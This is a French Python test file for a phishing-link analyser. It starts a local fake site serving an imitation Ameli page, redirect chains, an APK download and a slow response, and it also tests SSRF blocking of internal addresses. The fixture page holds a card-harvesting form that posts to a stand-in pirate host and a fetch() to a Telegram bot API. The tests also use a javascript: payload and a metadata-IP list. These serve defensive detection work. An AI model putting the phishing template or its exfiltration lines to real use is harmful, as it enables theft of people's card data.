"""Tests de l'analyseur de liens, sans Internet : un faux site de phishing tourne en local.

    python -m unittest verificateur_liens.test_analyse_lien -v
"""

import http.server
import threading
import time
import unittest
from unittest import mock

from verificateur_liens import analyse_lien as al

FAUSSE_PAGE_AMELI = """<!doctype html><html><head><meta charset="utf-8">
<title>Ameli - Votre remboursement</title></head><body>
<h1>Assurance Maladie</h1>
<p>Votre compte a été suspendu. Pour recevoir votre remboursement de 248,90 €,
mettez à jour vos informations sous 24h.</p>
<form action="https://collecte.exemple-pirate.net/envoi.php" method="post">
  <input name="nom"><input name="date_naissance" placeholder="Date de naissance">
  <input name="cc-number" autocomplete="cc-number" placeholder="Numéro de carte">
  <input name="cvv" placeholder="CVV"><input type="submit" value="Valider">
</form>
<script>fetch("https://api.telegram.org/bot123:ABC/sendMessage", {method: "POST"});</script>
</body></html>"""

PAGE_SAINE = """<!doctype html><html><head><title>Recette de la tarte aux pommes</title></head>
<body><p>Épluchez les pommes, étalez la pâte et enfournez 35 minutes.</p></body></html>"""


class FauxSite(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def envoyer(self, code, corps=b"", type_="text/html; charset=utf-8", entetes=()):
        self.send_response(code)
        self.send_header("Content-Type", type_)
        for cle, valeur in entetes:
            self.send_header(cle, valeur)
        self.send_header("Content-Length", str(len(corps)))
        self.end_headers()
        self.wfile.write(corps)

    def do_GET(self):
        port = self.server.server_address[1]
        if self.path == "/ameli":
            self.envoyer(200, FAUSSE_PAGE_AMELI.encode())
        elif self.path == "/saine":
            self.envoyer(200, PAGE_SAINE.encode())
        elif self.path == "/redir":
            self.envoyer(302, entetes=[("Location", "/ameli")])
        elif self.path == "/meta":
            self.envoyer(200, b'<html><head><meta http-equiv="refresh" content="0;url=/ameli"></head></html>')
        elif self.path == "/js":
            self.envoyer(200, b'<html><script>window.location.href = "/ameli";</script></html>')
        elif self.path == "/boucle":
            self.envoyer(302, entetes=[("Location", "/boucle")])
        elif self.path == "/apk":
            self.envoyer(200, b"PK\x03\x04", "application/vnd.android.package-archive")
        elif self.path == "/vers-interne":
            # 127.0.0.2 = « réseau interne » pour ce test
            self.envoyer(302, entetes=[("Location", f"http://127.0.0.2:{port}/saine")])
        elif self.path == "/goutte":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            for _ in range(100):
                self.wfile.write(b"x")
                self.wfile.flush()
                time.sleep(0.2)
        else:
            self.envoyer(404, b"introuvable")


class TestHeuristiquesUrl(unittest.TestCase):
    def score(self, lien):
        rapport = al.Rapport()
        infos = al.analyser_url(al.normaliser_url(lien), rapport)
        return rapport.score(), infos, rapport

    def test_sites_officiels_et_banals(self):
        for lien in ["https://www.ameli.fr", "https://finance.yahoo.com", "https://amelie-boutique.fr",
                     "https://pineapple-shop.com", "https://www.binance.com"]:
            self.assertLess(self.score(lien)[0], al.SEUIL_SUSPECT, lien)

    def test_imitations(self):
        for lien in ["ameli-remboursement-securite.xyz/login", "https://paypa1.com/signin",
                     "https://www.paypal.com.secure-verify.top/account", "https://pаypal.com",
                     "https://impots-gouv-remboursement.com", "https://binnance.com"]:
            self.assertGreaterEqual(self.score(lien)[0], 45, lien)

    def test_liens_non_web_refuses(self):
        for lien in ["javascript:alert(1)", "itms-services://?action=download-manifest", "mailto:a@b.fr", ""]:
            with self.assertRaises(al.LienInvalide):
                al.normaliser_url(lien)

    def test_lien_desamorce(self):
        self.assertEqual(al.normaliser_url("hxxps://evil[.]com/x"), "https://evil.com/x")


class TestProtectionReseauInterne(unittest.TestCase):
    def test_adresses_internes_refusees(self):
        for hote in ["127.0.0.1", "localhost", "169.254.169.254", "10.0.0.1", "192.168.1.1",
                     "::1", "2130706433", "100.64.0.1"]:
            with self.assertRaises(al.LienRefuse, msg=hote):
                al._resoudre(hote, 80)

    def test_port_exotique_refuse(self):
        with self.assertRaises(al.LienRefuse):
            al._requete("http://exemple.com:22/", time.monotonic() + 5, "test", "*/*")

    def test_analyse_complete_vers_localhost(self):
        resultat = al.analyser("http://127.0.0.1:8080/admin", scan_navigateur=False)
        self.assertIn("interne", resultat["page"]["erreur"])


class TestFauxSiteLocal(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.serveur = http.server.ThreadingHTTPServer(("127.0.0.1", 0), FauxSite)
        cls.port = cls.serveur.server_address[1]
        threading.Thread(target=cls.serveur.serve_forever, daemon=True).start()
        # Pour ce test seulement : 127.0.0.1 est considéré comme « Internet », 127.0.0.2 reste interne.
        cls.patchs = [
            mock.patch.object(al, "_ip_autorisee", lambda ip: ip == "127.0.0.1"),
            mock.patch.object(al, "PORTS_AUTORISES", al.PORTS_AUTORISES | {cls.port}),
            mock.patch.object(al, "age_domaine", lambda d, budget=12: {
                "connu": True, "cree_le": "2026-11-20", "age_jours": 3}),
        ]
        for patch in cls.patchs:
            patch.start()

    @classmethod
    def tearDownClass(cls):
        for patch in cls.patchs:
            patch.stop()
        cls.serveur.shutdown()

    def url(self, chemin):
        return f"http://127.0.0.1:{self.port}{chemin}"

    def analyser(self, chemin):
        al._cache.clear()
        return al.analyser(self.url(chemin), scan_navigateur=False)

    def test_faux_ameli_detecte(self):
        r = self.analyser("/ameli")
        self.assertEqual(r["verdict"], "🔴 DANGEREUX")
        alertes = " ".join(r["signaux_alerte"])
        for attendu in ["carte bancaire", "Telegram", "AUTRE site", "Ameli", "pressant"]:
            self.assertIn(attendu, alertes)
        self.assertIn("une carte bancaire", r["page"]["la_page_demande"])
        self.assertIn("remboursement", r["page"]["extrait_texte_NON_FIABLE"])

    def test_page_saine(self):
        r = self.analyser("/saine")
        self.assertNotIn("carte", " ".join(r["signaux_alerte"]))
        self.assertEqual(r["page"]["titre"], "Recette de la tarte aux pommes")

    def test_redirections_suivies(self):
        for chemin, mode in [("/redir", "http"), ("/meta", "meta refresh"), ("/js", "JavaScript")]:
            r = self.analyser(chemin)
            self.assertEqual(len(r["chaine_redirections"]), 2, chemin)
            self.assertEqual(r["chaine_redirections"][0]["par"], mode)
            self.assertEqual(r["verdict"], "🔴 DANGEREUX", chemin)

    def test_page_qui_se_redirige_sur_elle_meme(self):
        r = self.analyser("/boucle")
        self.assertEqual(len(r["chaine_redirections"]), 1)

    def test_age_du_domaine(self):
        rapport = al.Rapport()
        al.noter_age({"connu": True, "cree_le": "2026-11-20", "age_jours": 3}, "exemple.xyz", rapport)
        self.assertIn("créé il y a 3 jour", rapport.signaux[0]["detail"])
        rapport = al.Rapport()
        al.noter_age({"connu": True, "cree_le": "2010-01-01", "age_jours": 6000}, "exemple.fr", rapport)
        self.assertEqual(rapport.score(), 0)
        self.assertTrue(rapport.rassurants)

    def test_telechargement_apk(self):
        r = self.analyser("/apk")
        self.assertIn("application Android", " ".join(r["signaux_alerte"]))

    def test_redirection_vers_reseau_interne_bloquee(self):
        r = self.analyser("/vers-interne")
        self.assertIn("interne", " ".join(r["signaux_alerte"]))

    def test_site_au_compte_gouttes_ne_bloque_pas(self):
        with mock.patch.object(al, "BUDGET_PAGE", 3):
            debut = time.monotonic()
            self.analyser("/goutte")
            self.assertLess(time.monotonic() - debut, 15)


if __name__ == "__main__":
    unittest.main()
